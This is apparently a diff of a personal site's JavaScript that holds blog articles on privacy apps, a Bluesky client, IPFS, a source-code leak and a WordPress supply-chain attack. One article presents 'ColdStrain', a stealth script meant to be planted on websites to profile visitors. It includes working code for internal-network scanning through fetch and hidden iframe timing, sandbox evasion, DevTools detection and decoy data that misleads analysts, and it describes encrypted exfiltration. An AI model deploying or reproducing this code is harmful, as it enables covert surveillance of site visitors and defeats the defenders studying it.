+                            { l: "Host", v: `: ${window.location.hostname || 'localhost'}`, c1: "#3498db", c2: "#e0e0e0" },
+                            { l: "Resolution", v: `: ${res}`, c1: "#3498db", c2: "#e0e0e0" },
+                            { l: "CPU Cores", v: `: ${cores}`, c1: "#3498db", c2: "#e0e0e0" },
+                            { l: "Memory", v: `: ${ram}`, c1: "#3498db", c2: "#e0e0e0" },
+                            { l: "Uptime", v: `: ${uptime}`, c1: "#3498db", c2: "#e0e0e0" }
+                        ];
+
+                        console.clear();
+                        console.log("%c--- TERMINAL SESSION INITIATED ---", "color: #2ecc71; font-style: italic;");
+                        
+                        const maxLines = Math.max(art.length, info.length);
+                        for (let i = 0; i < maxLines; i++) {
+                            const left = (art[i] || "            ").padEnd(12, " ");
+                            const rightInfo = info[i] || { l: "", v: "", c1: "", c2: "" };
+                            
+                            console.log(
+                                `%c${left}  %c${rightInfo.l}%c${rightInfo.v}`,
+                                "color: #2ecc71; font-weight: bold; font-family: monospace;",
+                                `color: ${rightInfo.c1}; font-weight: bold; font-family: monospace;`,
+                                `color: ${rightInfo.c2}; font-family: monospace;`
+                            );
+                        }
+                        
+                        return "--- sys.fetch complete ---";
+                    }
+                    
+                    return `Command '${prop}' not found. Try typing: nulsie.fetch`;
+                }
+            });
+        },
+        configurable: true,
+        enumerable: false
+    });
+// ==========================================
+// WRITINGS SPA (Instant "Redirect" Style)
+// ==========================================
+
+const articles = [
+    {
+        id: 'article1',
+        title: "It's Not That Hard to Make REALLY Privacy Focused Applications",
+        date: '2026 Feb 12',
+        content: `<p>Lately I'm seeing a lot, like I mean a lot of privacy and security related applications going extinct, I'm not talking about the normal stuff owned by for-profits which just say 'privacy focused' but actually useful apps and software created by a bunch of cyber junkies for cyber junkies, well i guessed that the reason was funding and donations drying up, but when i did some more digging i found that, the primary reason is not money but SIMPLY THAT IT'S NOT "FEASIBLE", like i was just dumbfounded, that developers just stopped getting more aware of privacy because its just not feasible.</p>
+                      <p>So to see how difficult it was to make an actual privacy focused app in the present and to see if the developers are just lazy, i started making a web based encryption storage system.</p>
+                      <p>At first it was easy, I made the plan; to make a really isolated storage app in the web which nobody could poke into.</p>
+                      <p>I divided my project into 5 phases, the first one was ofcourse the usual one of laying the foundation and the concept, I wanted the app to be completely air-gapped, so my plan was to manually download the libraries needed and make it work flawlessly offline. I used <code>Tailwind</code> for a custom 'Mac OS 8/9 Platinum' style, I really don't know why i chose that but it looked retro and good, then I chose the <code>CryptoJS</code> library for the data encryption and authentication, for storage i was using the browser's <code>localStorage</code> as it was ideal enough for the project and remember that all of these was free amd open source and coud be downloaded from almost anywhere on the internet. First i planned that the whole app aas going to be an SPA(Single Page Application) so i could already patch up a surprising number of vulnerabilities, and as it already was completely offline based, i had made it nearly impossible for anybody to remotely hack it. And i made the basic version of the app, with a login tab and a registration tab, i purposefully removed the back up option to not make a security/privacy backdoor hence again removing another common vulnerability and also making the app easier to develop. I used AES-256 for the encryption of the data stored and used SHA-256 for the hashing of all the credentials,  for the passkey, i used the same hashing but layered with PBKDF2 with 100000 iterations hence again preventing brute force attacks, and it has only been a day of work. Next i added a feature called the Volatile Random Access Memory Purge(VRAMP) which when logged out would wipe the entire credential entered clean and overwrites the wiped memory with random noise which are separately generated through the <code>window.crypto.getRandomValues</code> feature of the CryptoJS library. After this i created the very espionage-esque feature of a 'Duress Passkey', a secondary passkey set during registration, and if this is entered duting log in, the system silently wipes the entire data stored in the given user's vault, saves the empty state and logs the user(or the interrogator) in. It appears as a legit log in but actually the data is purged, and this was done through very simple lines of code.</p>
+                      <p>And with a bunch of other features, i made a pretty powerful and secure text based storage(as in the end i thought, a hybrid storage of both text and images could open up new vulnerabilities) system called PIES or Pretty Isolated and Encrypted Software(it's on the dev repo) which was completely zero gapped amd could be text based storage apps which normies like us could get our hands on(only if used correctly), and this all happened in a matter of a week, so now i proved that it's not that hard to make a very privacy focused tool or is it unfeasible as in this world where you could be tracked or hacked in a matter of minutes, with the right tools you can stay safe, and also a big deemed problem by the devs is that making some systems could get the devs themselves in jeopardy on matters like illicit users(which are just excuses used by entities for mass surveillance), but with this app where there is no server collecting data or anything pinging anyone other user storing data, nobody can practically subpoena me to give up info, as i'm legally not binded to, hence stripping myself of my 'responsibilities' so look in this way, was this even expensive or even time consuming, no it was not. So just make more privacy focused apps.</p>`
+    },
+    {
+        id:'article2', 
+            title: "I made a web client for Bsky.",
+            date: "2026 March 10",
+            content: `<p>So i just started using Bluesky after i just toyed on using it or not, but with my hate for the data harvesters also called Instagram, TikTok etc. made me use Bluesky.</p>
+                <p>After a bit of usage, I started to like Bluesky, but i still didn't like that it had the suggestions tab and used analytics(something that i hate a lot and is the primary reason for my loath towards the data harvesters), so i planned to make a client for Bsky in the holy trinity of web dev.</p>
+                <p>The final product of a coding streak for this aim which lasted for three days was LycaClient, it was a full feature web based client in which there was no 'for you' tab or a suggestions feed but only the immediate settings and a search bar, so you would just search up for people who you want to see without a distraction from a third entity amd that you had control of who you wanted to look up for and algorithm wouldn't be there to breathing down your neck. And it did a great job in being a great client.</p>
+                <p>I didn't use any fancy frameworks or integrations for these as i really hate bloat, and used pure <code>HTML5</code>, <code>CSS</code> and <code>Vanilla JS(ES6+)</code>. I used the Bluesky <code>XRPC</code> for the real-time integration and for the user sign  and used the <code>Fetch API</code>for the data pulling. You can just check on the specs by just going to the <a href="https://github.com/nulsie/LycaClient"></a>GitHub repo. It was actually really simple and as Bsky uses the <code>ATProto</code> it was completely open source and free and naturally, dApps like Bsky are way more friendly with data fetching than the data harvesters because of the open source ATProto and the whole project was way easier than it looked</p>
+                <p>And as I was coding i also had an idea to create a 'Feather' version which could be compatible with older systems and as I aas finished with the main version(<code>v.1.1</code>) I started with the development of Feather and in a day or so I had finished that too and the Feather version, when I checked could be used in systems as old as 16 years.</p>
+                <p>And with this, I pushed the code for both versions and now i'm on my way on working on something else, and I'm planning on adding video feed features and better richText formatting which currently is not there in v.1.1.</p>`
+        },
+    {
+        id: 'article3', 
+        title: "LycaClient v1.2 is Here", 
+        date: '2026 Mar 15', 
+        content: `<p>Hey, the v.1.2 is here with all the updates. And I've added two new features.</p>
+            <p>After v.1.1, the v.1.2 was obviously a bit more effort-heavy, as adding the richText formatting was a bit of a headache, because Bsky uses UTF-16 for its formatting while the normal web uses UTF-8 so i had to come up with a good parser for it, bit still it was way easier than anything i had done before, i had also added the video support for posts and good for devs, i had also made the overall code a bit more readable than before.</p>
+            <p>I had done the transformation of <code>UTF-8</code> format to <code>UTF-16</code> through a parser which took most of the development time of the v.1.2. The video support was surprisingly easier as I only had to use the <code>HLS.js</code> library to import the feature and it was pretty good then. So overall the v.1.2 is looking 'professionally' good.</p>`
+    }, 
+    {
+        id: 'article4', 
+        title: "A Fish CAN Forever", 
+        date: '2026 Mar 31', 
+        content: `<p>After spending some time with some guys who works on <code>IPFS(Inter-Planetery File System)</code>, I got an idea to create a something for it, a file transferring system easy enough for a person who knows the basics but actually a really sophisticated and security heavy system under the hood.</p>
+            <p>So i had known about the IPFS project for long time but had never done much of value for it even if i'm very interested in dApps and decentralized systems. So i planned as usual to do something. File transferring systems are abundant when it comes to IPFS but what i created was something which was more than a usual ones. And in the end I created what I call a hybridized system which is just a partially deccentralized system.</p>
+            <p>I called it EtCAN or the Eternal Content Addressable Network, and here a user will generate a private and a public key as a form of identity (like <code>PGP</code>) and uses the reciever user's public key to send the data and vice versa and this was the concept, I used the battle tested <code>TweetNaCl</code> library as my cryptographic base. <code>Curve25519</code> was used for <code>nacl.box</code> operations, and this provided pretty high speed, eliptic-curve based encryption for the assymetric encryption. And for the symmetric encryption i used the <code>XSalsa20-Poly1305</code> for the local data(contacts, config, and the secret key) using a master password. i then used the <code>PBKDF2-HMAC-SHA256</code> with <code>600000</code> iterations which was the OWASP recommended standard.</p>
+            <p>But what made it better was that it had a pretty high level security and privacy feature other than the encryption, it had a pretty well performing steganography engine built in it which was pretty good at the job and used the scattered LSB technique with a deterministic <code>PRNG(Mulberry32)</code> seeded by a random <code>32-bit</code> integer hidden in the first 32 pixels. And Instead of writing bits sequentially (which creates a visible "noise" pattern at the top of an image), it scatters the payload across the image's Least Significant Bits (LSB). It also forced <code>Alpha channels</code> to <code>255</code> to prevent data loss during transmission or the canvas rendering, and all this made this better than a lot of the same type applications. And this was also pretty easy as the hard part was actually a pretty expected one.</p>
+            <p>As it presented itself the hardest part actually was finding the 'pinning' service, so i started with supporting the <code>Pinata JWT</code> but for a complete decentralization this was not ideal as it would only maks the app partially decentralized, so i dabbled a bit with the <code>Crust network</code> but for some reason whenever i typed keys and credentials, it was always malformed for some reason so because of this i ended up with a partially decentralized applications, and i dabled with a lot of other ones but didn't work at all even though i digged deep enough and was just searching for a good pinning service for hours, i don't know why but for some reason none like i mean NONE worked amd using the self hosting option just broke the thing so there i was, <i>a fish CAN forever</i>. so I'll keep it Pinata till i find a good alternative but it's not actually a big deal as with the steganography and the encryption Pinata doesn't have anyway of surveillance as they will only see encrypted blobs lf data and seemingly normal images going through, so keeping it like this or changing doesn't change much. of the practice. And also that i added multiple gateway system in the downloading of the files which made it a bit more decentralized.</p>
+            <p>The next big feature i added was the feature of uploading entire directories of websites for mirroring or distributing them, and i used the <code>v1</code> of <code>CID</code> as it was the version good for site upload as it didn't need encryption. And with this features I think i have an actual high quality and sophisticated file transferring system, and please let messsage me on Matrix or something of you find a nice pinning service.</p>`
+    },
+    {
+        id: 'article5', 
+        title: "Claude Leak...", 
+        date: '2026 April 1',
+        content: `<p>Like i don't know what to say, could this be worth millions, i don't know. So i woke up or something like that in the morning, i didn't get any wind at first as i'm not an AI guy or was i free. So I was not having a clue for about 2 hours, but then i got the news from a server in Discord, i was surprised to say the least, as even if i was not an AI guy, i was still knowledgeable about Claude and it's popularity, and to see the source code literally online for free was just otherworldly, but at the same time something like this already had a chance of happening as it had happened before, yeah with claude itself in 2025 February on Claude's launch day or something(reference from Dave Shoemaker) but when compared to this, that was nothing, because here almost everything of the orchestration logic of <code>Claude 4.6</code> was leaked.</p>
+            <p>And when i <b>dug</b> deeper, the whole thing looked stupid, it was that the map file for the version <code>2.1.88</code> had all the source code needed for every file within a <code>sourcesContent</code> array, and with this anybody could just run a simple script to map all the files and all the 512000 lines of Anthropic's original code in <code>TypeScript</code>. And all this happened just with the npm package for the 2.1.88 which had accidentally included these source files. So all of this was just behind a command like <code>npm publish --access public</code>  and such a simple error(or a 'human error' as quoted by Anthropic) could cause this mayhem(only for the company as i'm happy with this data harvester getting hit hard).</p>
+            <p>So the reception and response to this breach was your usual stuff, Anthropic was hit hella hard by the media amd everyone concerned. The leak was first found by a developer/security researcher by the name of Chaofan Shou who at approximately 4:23 AM (ET) on 31 March found this leak and posted about itbon X(@Fried_rice), and he provided a direct download link to the original expoaed source code in TypeScript hosted on Anthropic's Cloudflare R2 bucket (which by this time would be have been taken down), but then soon, a prominent Korean researcher who goes in the interconnected network by the name of Sigrid Jin published a Python-ised version of the source code under a new name of 'Claw-Code' on GitHub and boy, that repo bece the fastest growing GitHub repo of all time and by now mostly be having more than 160000 stars on GitHub.</p>
+            <p>But you guys be careful as some guys(<b>idbzoomh1</b>) has published repos with names like 'Leaked Claude Code' which was actually a lure attack containing Vidar. So i suggest you guys to download the Claw-Code instead of anything which looks suspicious on GitHub amd says stupid stuff like it offers 'enterprise features'.</p>
+            <p>The code was immediately analysed by devs, and the result was both expected and surprising, people found a some new features which was in beta or was unreleased like a feature called <strong>Buddy</strong> which was tamagotchi style companion, and a continuously used term in the code called <strong>KAIROS</strong> which was likely an always-on agent mentioned in the code nearly 150 times, according to the code it acts proactively in the background, responding to GitHub webhooks or Slack messages. It also had some questionable features like the telemetry and 'kill switch', which showed that the CLI tool polls an Anthropic settings endpoint every hour. This allows the company to remotely toggle feature "kill-switches" and push policy changes to your local running instance without your direct interaction. But it was expected as for an AI company which would do anything to harvest your data. The code also had some info on some upcoming models(names like Capybara and Fennec).</p>
+            <p>When i audited the code when i was free, it was not a magic box that everyone said it was but more like a really normal source code for a pretty powerful agent. So i was not necessarily surprised by the features but was surely surprised on the scale of the breach and how much have gone public domain.</p>
+            <p>And in the middle of this breach some people had used it as a pretty vile opportunity to do some cyber mischief as a bunch of fake repos have popped up in GitHub offering the 'leaked code' which will instead infect your device with something like Vidar and a pretty large scale npm poisoning attack happened in which the users who have downloaded the update(2.1.88) on 31 between 00:21 and 03:29 UTC might have had a chance of inadvertently pulling a Remote Access Trojan(RAT) ware. But cmon, why all this on March 31st, it would've been perfect if it was the April 1st.</p>`
+    },
+    {
+        id: 'article6', 
+        title: "A Nice Dose of Web-based Reconnaissance", 
+        date: '2026 Apr 19', 
+        content: `<p>So after the leak and stuff, i had developed a feeling for security and stuff, and a fter a bit of thinking i had decided to make a web-based reconaissance tool(well legally a PoC) which i had decided to be able to aggressively gather data and would work in background in maximum stealth.</p>
+            <p>after staring at the wall for sometime, i had developed the bigger picture, that the tool would be in the form of a JS script Or a library which would be pretty easy to plug in a website, basically that the tool could be planted easily in a website which would then start doing the recon on each user or the target whi visited it. but for this i had to exploit something in the browser,as this should be stealty and aggressive and shouldn't be like nMAP which anybody who know a bit of networking could detect with a nice firewall. so after some digging, i decided that i'd use 'the supreme IP leaker of browsers', <code>WebRTC</code>, and here i would exploit the flaws of WebRTC to get the recon working and use other browser APIs. and here the tool would establish a dummy WebRTC channel with the target which then would increase the trust of the browser and then would harvest as much as possible through that.</p>
+            <p>then i started with the classic IP leaker feature, which RTC was notoriously known for. unfortunately the latest versions of Chrome and Safari and hardened ones like Firefox and Brave had had enough of WebRTC and had either sidelined the API or had patched the issue, and here i couldn't do the simple raw local IP grab as the vendors had now used a thing called <code>multicastDNS</code> or <code>mDNS(RFC6762)</code>, and this masks the local IP with an encoded string with a <code>.local</code> suffix, hence now unreadable for the tool and i knew about the age old technique of getting media permission to force the browser into unmasking the IP(here the browser is tricked as usually WebRTC and media permission usually means that a video con or something is going on and the browser will unmask the IP for <i>'the best possible streaming quality'</i>) but currently it was only working smoothly for Chrome and Chromium based browsers and stuff like Firefox and Safari had made that, even if media permission is given unmasking wouldn't be done default unless with some enterprise config, so I had to add the 'loud' feature of media permission, but it was kinda a partial win for me as most people use Chrome and most people give media permissions and even if it's not given the other info would still be there and the users would just shrug it off as 'normal'.</p>
+            <p>then i added the other features like the detection of VPN through using <code>WebGL</code>to find if the target's GPU, and as most servers use GPUs like SwiftShader and home PCs use stuff like an Nvidia RTX, it would be a very strong identifier. and then i added features which used things like <code>Canvas Fingerprinting</code> and <code>WebCodecs</code> to get hardware-level info.</p>
+            <p>one of my favorite processes in this tool was the LAN mapping process, it was not like your usual LAN mapping where you have a bunch of common ISP IPs which you use to hit the router. but here it's pretty clever, the script starts with a hardcoded <code>Set</code> of the most common default gateways used by home and corporate routers.</p>
+            <pre>192.168.1.1 192.168.0.1 10.0.0.1</pre>
+            <p>then it's the 'adaptation' to the environment, it looks at the local IP it harvested during the WebRTC phase(<code>this.localInterfaces</code>), then it uses the <code>.split('.')</code> method:</p>
+            <ol>
+            <li>it takes the local IP(eg., 192.168.50.15).</li>
+            <li>it splits it into four parts(octets): ['192', '168', '50', '15'].</li>
+            <li>it slices off the first three: ['192', '168', '50'].</li>
+            <li>It rejoins them to create the subnet prefix: 192.168.50.</li>
+            </ol>
+            <p>once it has your subnet, it guesses where the router or other infrastructure might be by appending common suffixes: .1, .254, and .100. So, if your IP is 192.168.50.15, it automatically adds 192.168.50.1, 192.168.50.254, and 192.168.50.100 to its target list.</p>
+            <p>but the script doesn't just ping the IPs(which JS usually can't do). it uses two "error-based" detection methods, in the first method it attempts a <code>fetch()</code> to the target IP with the <code>no-cors</code> mode. even though the browser blocks the script from reading the content of the router's login page (due to CORS), the script can still see <b>how</b> the request failed. and in the result, if it gets a "Connection Refused" error quickly, it knows a device is there. if it simply "Times Out," it assumes no device is at that IP. in the second method, as this is is a fallback, it is even more subtle. It creates a hidden <code>iframe</code> and points its <code>src</code> to the target IP on an obscure port (like <code>:31337</code>). it starts a timer using <code>performance.now()</code>. and in the detection, a live host will respond (even with an "Error: Reset" or "Refused") much faster than a non-existent host. if the <code>onerror</code> fires in under 1.4 seconds, the script flags that IP as <b>"ALIVE (Timing Bypass)."</b> by doing this, the script builds a map of the internal network without ever needing specialized permissions or complex pattern matching. It's essentially using the browser's own security errors as a radar.</p>
+<pre><code class="language-javascript">// Phase 1: Establish baseline and adapt to discovered local subnet
+const gateways = new Set(['192.168.1.1', '192.168.0.1', '10.0.0.1']);
+
+this.localInterfaces.forEach(ip => {
+    // Ensure we have a raw IPv4 address, not a masked mDNS (.local)
+    if (ip.includes('.') &amp;&amp; !ip.endsWith('.local')) {
+        const octets = ip.split('.');
+        if (octets.length === 4) {
+            // Slice the first three octets to get the subnet prefix
+            const subnet = octets.slice(0, 3).join('.');
+            
+            // Append common gateway addresses
+            gateways.add(\`\${subnet}.1\`);   // Primary router guess
+            gateways.add(\`\${subnet}.254\`); // Secondary common gateway
+            gateways.add(\`\${subnet}.100\`); // Common DHCP start range
+        }
+    }
+});
+
+const targetList = Array.from(gateways);</code></pre>
+<pre><code class="language-javascript">// Phase 2: Probe targets using Fetch timing
+const pingViaFetch = async (ip) => {
+    const controller = new AbortController();
+    // Set a strict 1200ms timeout. Anything slower is considered an empty IP.
+    const timeoutId = setTimeout(() => controller.abort(), 1200); 
+
+    try {
+        const start = performance.now();
+        await fetch(\`http://\${ip}\`, {
+            mode: 'no-cors',
+            cache: 'no-cache',
+            signal: controller.signal
+        });
+        const duration = performance.now() - start;
+        clearTimeout(timeoutId);
+        
+        fetchActiveHosts.push({ ip: ip, ms: Math.round(duration), status: "ALIVE (Fetch Responded)" });
+    } catch (err) {
+        clearTimeout(timeoutId);
+        
+        // If the error isn't our manual abort timeout, the device actively refused the connection quickly
+        if (err.name !== 'AbortError') {
+            fetchActiveHosts.push({ ip: ip, status: "ALIVE (Fetch Refused)" });
+        }
+    }
+};</code></pre>
+<pre><code class="language-javascript">// Phase 3: Probe targets using Iframe Navigation Timing
+const probeIp = async (ip) => {
+    return new Promise((resolve) => {
+        const iframe = document.createElement('iframe');
+        iframe.style.display = 'none'; // Keep it hidden from the user
+        
+        const start = performance.now();
+        
+        // Failsafe timeout to clean up the DOM
+        const timeoutId = setTimeout(() => {
+            if (document.body.contains(iframe)) document.body.removeChild(iframe);
+            resolve(); 
+        }, 1500);
+
+        // Listen for both onload and onerror to catch any response
+        iframe.onload = iframe.onerror = () => {
+            const duration = performance.now() - start;
+            clearTimeout(timeoutId);
+            
+            if (document.body.contains(iframe)) document.body.removeChild(iframe);
+
+            // If the browser threw an error faster than 1400ms, a device actively closed the connection
+            if (duration &lt; 1400) {
+                activeHosts.push({ ip: ip, ms: Math.round(duration), status: "ALIVE (Timing Bypass)" });
+            }
+            resolve();
+        };
+
+        document.body.appendChild(iframe);
+        // Point to the target IP on a port unlikely to be open
+        iframe.src = \`http://\${ip}:31337\`; 
+    });
+};</code></pre>
+   <p>then i added the other features like NAT topology identification feature, then were several sophisticated anti-analysis features, the first was a <code>armOnMultiInteraction</code> method which ensured the payload doesn't fire in an automated sandbox (like VirusTotal or Joe Sandbox) as it required a stateful response human response of <code>mousemove</code>-><code>scroll</code>-><code>click</code>. then it verifies the <code>isTrusted</code> property on the click event to ensure it wasn't a programmatically generated click by a clanker, then there was a feature for <b>DevTools</b> detection where the code records the exact millisecond before and after a debugger; statement using <code>performance.now()</code>. in a normal environment, the script ignores this and executes it in less than a millisecond. If DevTools is open, the script halts execution. If the time delta exceeds 100ms, the script assumes a human is inspecting the code, and then a Chromium specific thing, the script creates a custom object with a modified <code>toString()</code> method that sets a flag (<code>detected = true</code>) when called. it then logs this object to the console using <code>console.log('%c', detector);</code>. in Chromium-based browsers (Chrome, Edge), the console automatically evaluates and stringifies objects to display them. if the console is closed, the object is never evaluated, and the trap remains untriggered. the second one is deceptive 'noise' method, where instead of terminating the script when analysis is detected (which is a strong indicator of malicious intent), ColdStrain utilizes <b>Dynamic Method Swapping</b> to feed the researcher fake data.</p>
+   <pre><code class="language-javascript">async _isDevToolsOpen() {
+        // Trap 1: Execution pause (Works across all browsers)
+        const start = performance.now();
+        debugger; 
+        const end = performance.now();
+        if (end - start &gt; 100) return true;
+
+        // Trap 2: toString() evaluation (Only safe to run on Chromium-based browsers)
+        const isChromium = !!window.chrome;
+        if (isChromium) {
+            let detected = false;
+            const detector = {
+                toString: () => { detected = true; return 'detector'; }
+            };
+            console.log('%c', detector); 
+            return detected;
+        }
+    }</code></pre>
+<pre><code class="language-javascript">this._noiseFunctions = {
+    harvest: () => Promise.resolve({ error: "ERR_ENCRYPT_FAIL", nonce: Math.random().toString(36) }),
+    syncToMesh: () => {},
+    getDeepMediaTelemetry: () => Promise.resolve({ status: "IDLE", hardware: "GENERIC_PnP" })
+};</code></pre>
+<pre><code class="language-javascript">async _checkIntegrity() {
+    const isOpen = await this._isDevToolsOpen();
+
+    if (isOpen &amp;&amp; !this._isShielded) {
+        this._applyNoise();
+    } else if (!isOpen &amp;&amp; this._isShielded) {
+        this._restoreLogic();
+    }
+}
+
+_applyNoise() {
+    this._isShielded = true;
+
+    Object.keys(this._noiseFunctions).forEach(m => {
+        this[m] = this._noiseFunctions[m];
+    });
+}</code></pre>
+<pre><code class="language-javascript">armOnMultiInteraction() {
+    let interactionState = 0;
+    let sequenceTimeout = null;
+
+    const resetSequence = () => {
+        if (interactionState &gt; 0) {
+            
+        }
+        interactionState = 0;
+        if (sequenceTimeout) {
+            clearTimeout(sequenceTimeout);
+            sequenceTimeout = null;
+        }
+    };
+
+    const triggerRecon = async () => {
+        console.log("[!] Complex human interaction verified. Executing payload...");
+        
+        window.removeEventListener('mousemove', handleMouse);
+        window.removeEventListener('scroll', handleScroll);
+        window.removeEventListener('click', handleClick);
+        clearTimeout(sequenceTimeout);
+        
+        try {
+            await this.syncToMesh();
+            
+        } catch (error) { }
+    };
+
+    const handleMouse = () => {
+        if (interactionState === 0) {
+            interactionState = 1; 
+            sequenceTimeout = setTimeout(resetSequence, 5000); 
+        }
+    };
+
+    const handleScroll = () => {
+        if (interactionState === 1) {
+            interactionState = 2; 
+        }
+    };
+
+    const handleClick = (event) => {
+        if (interactionState === 2) {
+            if (event.isTrusted &amp;&amp; (event.clientX !== 0 || event.clientY !== 0)) {
+                triggerRecon();
+            } else {
+                resetSequence();
+            }
+        }
+    };
+
+    window.addEventListener('mousemove', handleMouse);
+    window.addEventListener('scroll', handleScroll, { passive: true }); 
+    window.addEventListener('click', handleClick);
+}</code></pre>
+   <p>then it was the logic for the exfiltration of the data harvested to the fetcher or the dashboard which would be a site, and the thing i did made it extremely difficult to block the data transmission, as i used <code>Gun.js</code> database for the job, and because of this the whole thing would be decentralized, and instead of sending data to a central C2 server that can be easily blacklisted by DNS, it used a decentralized graph database. and before exfiltration, it uses the Web Crypto API to perform a hybrid encryption (RSA-OAEP for the key wrap and AES-GCM for the payload chunks). this ensured that even if the network traffic is captured, the data remained unreadable without the private key.</p>
+             <p>but then i found that these techniques or at least the ones which leaked important stuff, could be mitigated in the modern web, so i made it a bit more robust, in which i added more newer and more subtle fallback features for several features which made the whole thing even more robust and difficult to mitigate, like i added the <code>WebGPU</code> fingerprinting as a fallback for WebGL, made the VPN detection a multi feature process where different ways where used to get the data for the VPN detection,as a step by step process and added a new <code>MTU</code> analysis feature with <code>WebTransport</code> which more difficult to catch.</p>
+             <p>and with all these stuff, and 5 days of work, i created ColdStrain and ngl it was pretty sophisticated and effective for a web-based reconaissance tool....dw i didn't use it in this site, i really value privacy this was just a PoC for seeing how much of we could leak from a browser if we asked nicely.</p>`
+    },
+    {
+        id: 'article7', 
+        title: "WP's Essential Plugins for Getting Hijacked", 
+        date: '2026 Apr 22', 
+        content: `<p>i think it's a bit late to post this, i had learned about this days ago, but was too lazy to write it up, so here we go. so on 6th April, in between 4:22 and 11:06 UTC, almost all WordPress websites using the 'Essential Plugins' portfolio became victims of, in my perspective, the most sophisticated supply-chain attacks the platform has ever seen.</p> 
+        <p>the reason was pretty evident, as if any of you are in touch with web development or web sec, you might know that, WordPress's Plugin system is essentially a swamp infested with vulnerabilities. and the main reason i don't use and nearly avoids using WP is because of this. before learning about the vulns or the attack, you should know that the whole thing of the Plugins in WP are that these are essentially just php scripts which an owner of a WP site uses to add extra functionality that WP doesn't offer by itself, and due to this the whol deal of the Plugins is insanely popular in the platform, but i myself don't think that WP has done a thing of quality to make this system secure, and because of that the platform rarely ever monitors the transfer of ownership of these Plugins(more like insecure php scripts) or do they check on how secure this things are and if there is any zero-days in them.</p>
+        <p> now we're getting to the attack. likely on the August of 2025, a very nice person by the moniker of '<b>Kris</b>' legitimately bought the full Essential Plugins Portfolio of WP through the didgital market <b>Flippa</b> for some six-figure sum. then the person waited for nearly 8 months before doing anything. and after the long hiatus, on 6th April, in the timeframe i mentioned, a C2 domain called analytics.essentialplugin.com(it's a common thing in these areas to name the C2 with the word, 'analytics') started to distribute pesky payloads to all the sites using the vulnerable plugins, then as y'all would've guessed the, the plugins downloaded this payload and then they were compromised were attacked. the aim of the attack was apparently to cloak  the search rankings, meaning to manipulate the rankings through attacking the <b>search engine crawlers</b>, so that changes the plot, now y'all can see that Kris targeted to manipulate the search rankings of the sites affected, not by actually attacking the sites themselves but using the plugins in these sites as vectors to sending the malicious payloads to the crawler, all done well thanks to how sloppy WP's monitoring systen was.</p>
+        <p>so this was all done through planting a <code>backdoor</code> in the plugins which let the C2 domain to inject the payloads. and Kris planted the backdoor after buying the Plugins, and this was hella easy as here, you aren't a megabrained mr.robot trying to get into a system and plant a backdoor, but your having the admin privilege for doing anything to the Plugin, so with that Kris could just type up somd lines of php and execute. the malicious code(the backdoor) was planted in v2.6.7 of the Plugin on the August of 2025, the same month Kris bought the Plugin(boy the person is <b>KEEN</b>), the changelog was ofcourse titled as a very innocent thing titled, “Check compatibility with WordPress version 6.8.2". this 191 lines of code sat silent for the whole 8 months. and when the day came, it was activated, then the Plugin's internal <code>wpos-analytics</code> module downloaded the file, which went by the title of <code>wp-comments-post.php</code> and then used that file to inject the code to the most vital file of any WP site, the <code>wp-config.php</code>. then the payload fetched spam links, fake pages etc. and fed them to the <code>Googlebot</code>. and as i said the code didn't do anything visible to the site, and the admins of those sites couldn't see any of this happening, as the code only fed the malicious code to the crawler. the C2 domain was itself pretty clever, instead of a usual domain which coud get seized easily, Kris deployed a tactic which is also seen in my project, <a href="https://github.com/nulsie/ColdStrain">ColdStrain</a> as the C2 resolved C2 server through an Ethereum smart contract, which meant Kris could change the domain frequently and change it as much as wanted, hence making it insanely difficult to takedown or blacklist the domain. this whole attack could've been even worse if it had targeted something more vital and had a bit more sophistication than search ranking manipulation, perhaps the user/visitor data if tye website had been a shopping site of sort, as these Plugins or php scripts or whatever have admin privileges in the site they are deployed.</p>
+        <p>and with this attack the sloppiness of WP's Plugin auditing system(or the lack of one) was crystal clear and WP could mitigate this entire attack if it had a robust auditing system, as it could easily catch the backdoor instantly(the problem being that the code is reviewed by WP when a Plugin is created but if it goes through a ownership transfer, nothing is done), and because of this stupidity, alot of sites had a bad time.</p>`
+    }
+];
+
+const mainPage = document.getElementById('main-page');
+const articlePage = document.getElementById('article-page');
+
+
+// Build the list on the main page
+const articleListUI = document.getElementById('article-list');
+const moreArticlesContainer = document.getElementById('more-articles-container');
+const moreArticlesBtn = document.getElementById('more-articles-btn');
+
+let isExpanded = false; // Tracks if the full list is shown
+
+function renderArticleList() {
+    // Clear the current list
+    articleListUI.innerHTML = ''; 
+    
+    // Sort newest first
+    const sortedArticles = [...articles].reverse(); 
+    const limit = 5;
+    
+    // If not expanded, only take the first 6; otherwise take all
+    const articlesToShow = isExpanded ? sortedArticles : sortedArticles.slice(0, limit);
+    
+    articlesToShow.forEach(article => {
+        const li = document.createElement('li');
+        li.className = "article-entry"; 
+        li.style.marginBottom = "15px";
+        li.innerHTML = `
+            <div style="font-size: 11px; opacity: 0.6; text-transform: uppercase;">${article.date}</div>
+            <a href="javascript:void(0)" onclick="openArticle('${article.id}')" 
+               style="font-size: 18px; color: var(--text-color); text-decoration: none; font-weight: bold;">
+               ${article.title}
+            </a>
+        `;
+        articleListUI.appendChild(li);
+    });
+
+    // Handle the button visibility and text toggle
+    if (sortedArticles.length > limit) {
+        moreArticlesContainer.style.display = 'block';
+        // Toggle between [+] and [-] symbols
+        moreArticlesBtn.innerText = isExpanded ? "[-] Show fewer articles" : "[+] More articles...";
+    } else {
+        moreArticlesContainer.style.display = 'none';
+    }
+}
+
+// Attach the toggle event
+moreArticlesBtn.addEventListener('click', () => {
+    isExpanded = !isExpanded;
+    renderArticleList();
+});
+
+// Initial render
+renderArticleList();
+
+// Initial render: show only the latest 6
+
+// Event listener to inject all articles when the button is clicked
+if (moreArticlesBtn) {
+    moreArticlesBtn.addEventListener('click', () => {
+        renderArticleList(true);
+    });
+}
+
+// Show article, hide everything else
+function openArticle(id) {
+    const article = articles.find(a => a.id === id);
+    if (!article) return;
+
+    // 1. Inject the content
+    document.getElementById('article-title').innerText = article.title;
+    document.getElementById('article-date').innerText = `Published: ${article.date}`;
+    document.getElementById('article-content').innerHTML = article.content;
+
+    // 2. Swap visibility
+    mainPage.style.display = 'none';
+    articlePage.style.display = 'block';
+    
+    // 3. IMPORTANT: Tell Prism to highlight the new code boxes
+    Prism.highlightAll();
+
+    window.scrollTo(0, 0);
+}
+
+// Show main page, hide article
+function closeArticle() {
+    articlePage.style.display = 'none';
+    mainPage.style.display = 'block';
+    window.scrollTo(0, 0);
+}
+ // ==========================================
+// SECRET TRIGGER LOGIC
+// ==========================================
+document.getElementById('secret-trigger').addEventListener('click', () => {
+    // 1. Notify the user
+    alert("f12 bud");
+
